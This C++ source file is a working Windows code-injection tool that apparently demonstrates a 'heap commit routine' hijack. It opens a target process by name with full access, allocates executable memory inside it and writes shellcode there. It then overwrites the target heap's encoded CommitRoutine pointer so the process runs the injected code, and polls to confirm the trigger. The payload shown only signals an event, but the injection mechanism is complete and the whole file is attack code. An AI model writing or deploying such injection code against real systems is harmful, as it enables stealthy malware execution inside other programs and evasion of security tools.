#include <heapcommit.hpp>
#include <heap.hpp>
#include <syscall.hpp>

#include <cstdlib>
#include <cstring>
#include <cstdio>

#include <windows.h>
#include <tlhelp32.h>

extern "C" {
	NTSTATUS NTAPI NtAllocateVirtualMemory(
		HANDLE ProcessHandle,
		void **BaseAddress,
		size_t ZeroBits,
		size_t *RegionSize,
		uint32_t AllocationType,
		uint32_t Protect
	);

	NTSTATUS NTAPI NtFreeVirtualMemory(
		HANDLE ProcessHandle,
		void **BaseAddress,
		size_t *RegionSize,
		uint32_t FreeType
	);
}

DWORD FindProcessByName(const char *processName)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	PROCESSENTRY32 pe = {sizeof(pe)};
	if (!Process32First(snapshot, &pe)) {
		CloseHandle(snapshot);
		return 0;
	}

	do {
		if (_stricmp(pe.szExeFile, processName) == 0) {
			CloseHandle(snapshot);
			return pe.th32ProcessID;
		}
	} while (Process32Next(snapshot, &pe));

	CloseHandle(snapshot);
	return 0;
}

struct RemoteMemory final {
	HANDLE process;
	void *addr;
	size_t size;

	RemoteMemory(HANDLE p, void *a, size_t s) : process(p), addr(a), size(s) {}

	~RemoteMemory() {
		if (addr && process && process != INVALID_HANDLE_VALUE) {
			size_t freeSize = size;
			NtFreeVirtualMemory(process, &addr, &freeSize, 0x4000);
		}
	}
};

int main(int argc, char *argv[])
{
	if (argc < 2) {
		return 1;
	}

	DWORD pid = 0;
	for (int retry = 0; retry < 60; ++retry) {
		pid = FindProcessByName(argv[1]);
		if (pid) break;
		Sleep(500);
	}

	if (!pid) {
		fprintf(stderr, "Process not found\n");
		return 1;
	}

	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!process) {
		return 1;
	}

	heap::ProcessBasicInfo pbi = {};
	NTSTATUS status = NtQueryInformationProcess(process, 0, &pbi, sizeof(pbi), nullptr);
	if (status != 0) {
		CloseHandle(process);
		return 1;
	}

	void *processHeap = nullptr;
	status = NtReadVirtualMemory(process, (uint8_t *)pbi.PebBaseAddress + 0x30, &processHeap, sizeof(processHeap), nullptr);
	if (status != 0) {
		CloseHandle(process);
		return 1;
	}

	constexpr size_t CODE_SIZE = 0x2000;
	constexpr size_t DATA_SIZE = 0x1000;

	void *remoteCode = nullptr;
	size_t codeAllocSize = CODE_SIZE;
	status = NtAllocateVirtualMemory(process, &remoteCode, 0, &codeAllocSize, 0x1000, 0x40);
	if (status != 0) {
		CloseHandle(process);
		return 1;
	}

	void *remoteDstData = nullptr;
	size_t dataAllocSize = DATA_SIZE;
	status = NtAllocateVirtualMemory(process, &remoteDstData, 0, &dataAllocSize, 0x1000, 0x40);
	if (status != 0) {
		CloseHandle(process);
		return 1;
	}

	RemoteMemory codeGuard(process, remoteCode, codeAllocSize);
	RemoteMemory dataGuard(process, remoteDstData, dataAllocSize);

	HANDLE hTriggerEvent = CreateEventA(nullptr, TRUE, FALSE, "HEAPCOMMIT_TRIGGER");
	if (!hTriggerEvent) {
		return 1;
	}

	struct StringData {
		char eventName[32];
	};

	StringData strData = {};
	strcpy_s(strData.eventName, sizeof(strData.eventName), "HEAPCOMMIT_TRIGGER");

	status = NtWriteVirtualMemory(process, remoteDstData, &strData, sizeof(strData), nullptr);
	if (status != 0) {
		CloseHandle(process);
		return 1;
	}

	uint64_t dstDataAddr = reinterpret_cast<uint64_t>(remoteDstData);
	uint64_t eventNamePtr = dstDataAddr + offsetof(StringData, eventName);

	uint8_t shellcode[] = {
		0x48, 0x83, 0xEC, 0x28,
		0x31, 0xC9,
		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xFF, 0xD0,
		0x48, 0x89, 0xC1,
		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x28,
		0xC3,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
	};

	HMODULE kernel32Local = LoadLibraryA("kernel32.dll");
	auto pOpenEventA = GetProcAddress(kernel32Local, "OpenEventA");
	auto pSetEvent = GetProcAddress(kernel32Local, "SetEvent");

	*reinterpret_cast<uint64_t*>(shellcode + 8) = reinterpret_cast<uint64_t>(pOpenEventA);
	*reinterpret_cast<uint64_t*>(shellcode + 18) = eventNamePtr;
	*reinterpret_cast<uint64_t*>(shellcode + 33) = reinterpret_cast<uint64_t>(pSetEvent);

	status = NtWriteVirtualMemory(process, remoteCode, shellcode, sizeof(shellcode), nullptr);
	if (status != 0) {
		CloseHandle(process);
		return 1;
	}

	uint32_t cookie = 0;
	status = NtReadVirtualMemory(process, (uint8_t *)pbi.PebBaseAddress + 0x78, &cookie, sizeof(cookie), nullptr);

	heap::FindResult result = heap::findCommitRoutine(process, processHeap, cookie);
	if (!result.found) {
		CloseHandle(process);
		return 1;
	}

	heapcommit::Config cfg = {
		.process = process,
		.processHeap = processHeap,
		.shellcode = remoteCode,
		.shellcodeSize = static_cast<uint32_t>(codeAllocSize),
		.loaderAddr = remoteCode,
		.dstData = remoteDstData,
		.commitRoutineOffset = result.offset
	};

	heapcommit::Status injStatus = heapcommit::inject(cfg);

	if (heapcommit::isValid(injStatus)) {
		constexpr int POLL_INTERVAL_MS = 500;
		constexpr int POLLS_PER_ARM = 10;

		uint8_t *heapCommitSlot = (uint8_t *)processHeap + result.offset;
		uint8_t *trampolineAddr = (uint8_t *)remoteCode + 0xE00;

		uint64_t originalEncoded = 0;
		NtReadVirtualMemory(process, heapCommitSlot, &originalEncoded, sizeof(originalEncoded), nullptr);

		bool triggered = false;
		int armCount = 0;

		while (!triggered && armCount < 12) {
			for (int poll = 0; poll < POLLS_PER_ARM; poll++) {
				Sleep(POLL_INTERVAL_MS);

				uint64_t currentVal = 0;
				NtReadVirtualMemory(process, heapCommitSlot, &currentVal, sizeof(currentVal), nullptr);

				if (currentVal == originalEncoded) {
					fprintf(stdout, "TRIGGERED\n");
					triggered = true;
					break;
				}
			}

			if (!triggered) {
				armCount++;
				uint64_t newEncoded = reinterpret_cast<uint64_t>(trampolineAddr) ^ originalEncoded;
				NtWriteVirtualMemory(process, heapCommitSlot, &newEncoded, sizeof(newEncoded), nullptr);
			}
		}
	}

	CloseHandle(process);
	return heapcommit::isValid(injStatus) ? 0 : 1;
}
